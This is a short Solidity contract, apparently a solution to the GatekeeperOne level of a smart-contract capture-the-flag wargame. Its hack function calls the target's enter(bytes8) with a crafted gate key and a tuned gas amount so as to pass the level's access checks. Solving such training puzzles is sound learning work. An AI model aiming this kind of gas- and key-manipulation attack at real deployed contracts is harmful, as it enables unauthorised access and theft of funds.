// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

import '@openzeppelin/contracts/math/SafeMath.sol';
import "hardhat/console.sol";
import "./GatekeeperOne.sol";


contract HackGatekeeperOne {

    function hack(address gk1, bytes8 _gateKey, uint256 gasToUse) external payable {
        (bool success,  ) = gk1.call{gas: gasToUse}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
        require(success, "Contract execution Failed");
    }

}